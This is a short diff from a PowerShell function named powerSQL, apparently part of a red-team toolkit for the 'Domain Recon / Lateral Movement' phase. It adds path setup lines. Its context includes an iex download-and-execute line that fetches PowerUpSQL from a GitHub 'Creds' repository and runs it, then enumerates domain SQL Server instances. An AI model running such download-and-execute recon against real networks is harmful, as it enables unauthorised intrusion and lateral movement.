@@ -1196,7 +1196,8 @@ function powerSQL
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement Phase
-   
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/PowerUpSQL.ps1')
     Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"
